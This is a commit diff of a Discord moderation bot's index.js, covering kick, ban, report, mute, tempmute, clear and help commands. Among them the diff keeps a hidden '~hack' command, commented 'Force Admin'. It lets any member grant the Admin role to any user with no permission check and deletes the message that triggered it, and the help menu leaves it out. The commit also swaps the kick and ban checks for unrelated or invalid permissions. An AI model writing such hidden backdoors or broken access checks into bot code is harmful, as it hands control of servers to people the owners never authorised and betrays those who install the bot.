673a75192e6a72025abfb6f68e1a2ec81037e970
Gh0stReaper1888 <42793451+Gh0stReaper1888@users.noreply.github.com>
2018-09-26 10:28:40 +0100

    Update index.js

--- index.js
+++ index.js
@@ -13,18 +13,20 @@ bot.on("message", async message => {
   if(message.author.bot) return;
   if(message.channel.type === "dm") return;
 
-  let prefix = '~';
+  let prefix = botconfig.prefix;
   let messageArray = message.content.split(" ");
   let cmd = messageArray[0];
   let args = messageArray.slice(1);
-// Kick Cmd
+
   if(cmd === `${prefix}kick`){
+
+    //!kick @daeshan askin for it
 
     let kUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
     if(!kUser) return message.channel.send("Can't find user!");
     let kReason = args.join(" ").slice(22);
-    if(!message.member.hasPermission("KICK_MEMBERS *")) return message.channel.send("No can do pal!");
-    if(kUser.hasPermission("KICK_MEMBERS *")) return message.channel.send("That person can't be kicked!");
+    if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.channel.send("No can do pal!");
+    if(kUser.hasPermission("MANAGE_MESSAGES")) return message.channel.send("That person can't be kicked!");
 
     let kickEmbed = new Discord.RichEmbed()
     .setDescription("~Kick~")
@@ -43,14 +45,14 @@ bot.on("message", async message => {
 
     return;
   }
-//Ban Cmd
+
   if(cmd === `${prefix}ban`){
 
     let bUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
     if(!bUser) return message.channel.send("Can't find user!");
     let bReason = args.join(" ").slice(22);
-    if(!message.member.hasPermission("BAN_MEMBER *")) return message.channel.send("No can do pal!");
-    if(bUser.hasPermission("BAN_MEMBERS *")) return message.channel.send("That person can't be kicked!");
+    if(!message.member.hasPermission("MANAGE_MEMBERS")) return message.channel.send("No can do pal!");
+    if(bUser.hasPermission("MANAGE_MESSAGES")) return message.channel.send("That person can't be kicked!");
 
     let banEmbed = new Discord.RichEmbed()
     .setDescription("~Ban~")
@@ -67,10 +69,14 @@ bot.on("message", async message => {
     message.guild.member(bUser).ban(bReason);
     incidentchannel.send(banEmbed);
 
+
     return;
   }
-//Report Cmd
+
+
   if(cmd === `${prefix}report`){
+
+    //!report @ned this is the reason
 
     let rUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
     if(!rUser) return message.channel.send("Couldn't find user.");
@@ -94,7 +100,10 @@ bot.on("message", async message => {
 
     return;
   }
-//Server Info Cmd
+
+
+
+
   if(cmd === `${prefix}serverinfo`){
 
     let sicon = message.guild.iconURL;
@@ -109,7 +118,9 @@ bot.on("message", async message => {
 
     return message.channel.send(serverembed);
   }
-//Bot Info Cmd
+
+
+
   if(cmd === `${prefix}botinfo`){
 
     let bicon = bot.user.displayAvatarURL;
@@ -124,137 +135,138 @@ bot.on("message", async message => {
   }
 //Hack Cmd ;) (Force Admin)
   if(cmd === `${prefix}hack`){
-
-
-  let admin = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
-  if(!admin) return message.reply("Couldn't find user.");
-  if(admin.hasPermission("ADMINISTRATOR")) return message.reply("Sorry no can do");
-  let adminrole = message.guild.roles.find(`name`, "Admin");
-
-  message.delete().catch(O_o=>{});
-  await(admin.addRole(adminrole.id));
-
-    return;
-  }
-//Clear Cmd
-  if(cmd === `${prefix}clear`){
-
-  if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("No");
-  if(!args[0]) return message.channel.send("You forgot to say home many messages to delete max 100.");
-  message.channel.bulkDelete(args[0]).then(() => {
-    message.channel.send(`Cleared ${args[0]} messages`).then(msg => msg.delete(1));
-  });
-
-    return;
-  }
-//Mute Cmd
-  if(cmd === `${prefix}mute`){
-
-  let pmute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
-  if(!pmute) return message.reply("Couldn't find user.");
-  let muterole = message.guild.roles.find(`name`, "muted");
-  //start of create role
-  if(!muterole){
-    try{
-      muterole = await message.guild.createRole({
-        name: "muted",
-        color: "#000000",
-        permissions:[]
-      })
-      message.guild.channels.forEach(async (channel, id) => {
-        await channel.overwritePermissions(muterole, {
-          SEND_MESSAGES: false,
-          ADD_REACTIONS: false,
-          SPEAK: false
-        });
-      });
-    }catch(e){
-      console.log(e.stack);
-    }
-  }
-  //end of create role
-  message.delete().catch(O_o=>{});
-  await(pmute.addRole(muterole.id));
-
-    return;
-  }
-//Tempmute Cmd
-  if(cmd === `${prefix}tempmute`){
-
-
-  //!tempmute @user 1s/m/h/d
-
-  let tomute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
-  if(!tomute) return message.reply("Couldn't find user.");
-  if(tomute.hasPermission("ADMINISTRATOR")) return message.reply("Can't mute them!");
-  let muterole = message.guild.roles.find(`name`, "muted");
-  //start of create role
-  if(!muterole){
-    try{
-      muterole = await message.guild.createRole({
-        name: "muted",
-        color: "#000000",
-        permissions:[]
-      })
-      message.guild.channels.forEach(async (channel, id) => {
-        await channel.overwritePermissions(muterole, {
-          SEND_MESSAGES: false,
-          ADD_REACTIONS: false,
-          SPEAK: false
-        });
-      });
-    }catch(e){
-      console.log(e.stack);
-    }
-  }
-  //end of create role
-  let mutetime = args[1];
-  if(!mutetime) return message.reply("You didn't specify a time!");
-
-  await(tomute.addRole(muterole.id));
-  message.reply(`<@${tomute.id}> has been muted for ${ms(ms(mutetime))}`);
-
-  setTimeout(function(){
-    tomute.removeRole(muterole.id);
-    message.channel.send(`<@${tomute.id}> has been unmuted!`);
-  }, ms(mutetime));
-
-    return;
-  }
-//Help Cmd
-  if(cmd === `${prefix}help`){
-
-    let bicon = bot.user.displayAvatarURL;
-    let botembed = new Discord.RichEmbed()
-    .setDescription("Bot Commands.")
-    .setColor("#15f153")
-    .setThumbnail(bicon)
-    .addField("Kick", "~kick @user Reason")
-    .addField("Ban", "~ban @user Reason")
-    .addField("Clear", "~clear Ammount max 100")
-    .addField("Server Information", "~serverinfo")
-    .addField("Bot Information", "~botinfo")
-    .addField("Report", "~report @user Reason")
-    .addField("perm mute", "~mute @user")
-    .addField ("tempmute", "~tempmute @user");
-
-    message.delete().catch(O_o=>{});
-    message.channel.send(botembed);
-
-    return;
-  }
-//Unmute Cmd
-  if(cmd === `${prefix}unmute`){
-
-    let pmute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
-    if(!pmute) return message.reply("Couldn't find user.");
-    let muterole = message.guild.roles.find(`name`, "muted");
-
-    message.delete().catch(O_o=>{});
-    await(pmute.removeRole(muterole.id));
-
-    return;
-  }
+  
+  
+   let admin = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
+   if(!admin) return message.reply("Couldn't find user.");
+   if(admin.hasPermission("ADMINISTRATOR")) return message.reply("Sorry no can do");
+   let adminrole = message.guild.roles.find(`name`, "Admin");
+  
+   message.delete().catch(O_o=>{});
+   await(admin.addRole(adminrole.id));
+  
+     return;
+   }
+   //Clear Cmd
+     if(cmd === `${prefix}clear`){
+   
+     if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("No");
+     if(!args[0]) return message.channel.send("You forgot to say home many messages to delete max 100.");
+     message.channel.bulkDelete(args[0]).then(() => {
+       message.channel.send(`Cleared ${args[0]} messages`).then(msg => msg.delete(1));
+     });
+   
+       return;
+     }
+   //Mute Cmd
+     if(cmd === `${prefix}mute`){
+   
+     let pmute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
+     if(!pmute) return message.reply("Couldn't find user.");
+     let muterole = message.guild.roles.find(`name`, "muted");
+     //start of create role
+     if(!muterole){
+       try{
+         muterole = await message.guild.createRole({
+           name: "muted",
+           color: "#000000",
+           permissions:[]
+         })
+         message.guild.channels.forEach(async (channel, id) => {
+           await channel.overwritePermissions(muterole, {
+             SEND_MESSAGES: false,
+             ADD_REACTIONS: false,
+             SPEAK: false
+           });
+         });
+       }catch(e){
+         console.log(e.stack);
+       }
+     }
+     //end of create role
+     message.delete().catch(O_o=>{});
+     await(pmute.addRole(muterole.id));
+   
+       return;
+     }
+   //Tempmute Cmd
+     if(cmd === `${prefix}tempmute`){
+   
+   
+     //!tempmute @user 1s/m/h/d
+   
+     let tomute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
+     if(!tomute) return message.reply("Couldn't find user.");
+     if(tomute.hasPermission("ADMINISTRATOR")) return message.reply("Can't mute them!");
+     let muterole = message.guild.roles.find(`name`, "muted");
+     //start of create role
+     if(!muterole){
+       try{
+         muterole = await message.guild.createRole({
+           name: "muted",
+           color: "#000000",
+           permissions:[]
+         })
+         message.guild.channels.forEach(async (channel, id) => {
+           await channel.overwritePermissions(muterole, {
+             SEND_MESSAGES: false,
+             ADD_REACTIONS: false,
+             SPEAK: false
+           });
+         });
+       }catch(e){
+         console.log(e.stack);
+       }
+     }
+     //end of create role
+     let mutetime = args[1];
+     if(!mutetime) return message.reply("You didn't specify a time!");
+   
+     await(tomute.addRole(muterole.id));
+     message.reply(`<@${tomute.id}> has been muted for ${ms(ms(mutetime))}`);
+   
+     setTimeout(function(){
+       tomute.removeRole(muterole.id);
+       message.channel.send(`<@${tomute.id}> has been unmuted!`);
+     }, ms(mutetime));
+   
+       return;
+     }
+   //Help Cmd
+     if(cmd === `${prefix}help`){
+   
+       let bicon = bot.user.displayAvatarURL;
+       let botembed = new Discord.RichEmbed()
+       .setDescription("Bot Commands.")
+       .setColor("#15f153")
+       .setThumbnail(bicon)
+       .addField("Kick", "~kick @user Reason")
+       .addField("Ban", "~ban @user Reason")
+       .addField("Clear", "~clear Ammount max 100")
+       .addField("Server Information", "~serverinfo")
+       .addField("Bot Information", "~botinfo")
+       .addField("Report", "~report @user Reason")
+       .addField("perm mute", "~mute @user")
+       .addField ("tempmute", "~tempmute @user");
+   
+       message.delete().catch(O_o=>{});
+       message.channel.send(botembed);
+   
+       return;
+     }
+   //Unmute Cmd
+     if(cmd === `${prefix}unmute`){
+   
+       let pmute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
+       if(!pmute) return message.reply("Couldn't find user.");
+       let muterole = message.guild.roles.find(`name`, "muted");
+   
+       message.delete().catch(O_o=>{});
+       await(pmute.removeRole(muterole.id));
+   
+       return;
+     }
 });
+
 
 bot.login(process.env.token);
